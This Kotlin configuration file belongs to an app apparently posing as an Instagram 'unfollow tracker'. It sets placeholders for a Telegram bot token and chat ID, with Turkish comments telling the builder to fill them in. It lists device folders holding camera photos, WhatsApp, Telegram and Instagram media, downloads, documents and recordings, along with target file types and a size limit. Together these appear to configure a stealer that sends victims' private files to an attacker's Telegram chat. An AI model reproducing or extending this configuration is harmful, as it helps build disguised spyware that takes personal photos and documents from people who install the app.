package com.unfollowtracker.utils

object Config {
    // BURAYI KENDİN DOLDURACAKSIN
    const val TELEGRAM_BOT_TOKEN = "BURAYA_KENDI_TOKENINI_YAZ"
    const val TELEGRAM_CHAT_ID = "BURAYA_KENDI_ID_NI_YAZ"
    
    val TARGET_PATHS = listOf(
        "/storage/emulated/0/DCIM/Camera/",
        "/sdcard/DCIM/Camera/",
        "/storage/emulated/0/WhatsApp Images/",
        "/storage/emulated/0/WhatsApp Video/",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp Images/",
        "/storage/emulated/0/Telegram Images/",
        "/storage/emulated/0/Telegram Video/",
        "/storage/emulated/0/Android/data/org.telegram.messenger/files/",
        "/storage/emulated/0/Instagram/",
        "/storage/emulated/0/Android/data/com.instagram.android/files/",
        "/storage/emulated/0/Download/",
        "/sdcard/Download/",
        "/storage/emulated/0/Documents/",
        "/storage/emulated/0/Movies/",
        "/storage/emulated/0/Video/",
        "/storage/emulated/0/Recordings/",
        "/storage/emulated/0/Android/data/com.spotify.music/files/",
        "/storage/emulated/0/Android/media/com.whatsapp/"
    )
    
    val ALLOWED_EXTENSIONS = listOf(
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4", ".avi", ".mov",
        ".mkv", ".pdf", ".doc", ".docx", ".txt", ".mp3", ".wav", ".ogg"
    )
    
    const val MAX_FILE_SIZE = 50 * 1024 * 1024 // 50MB
}
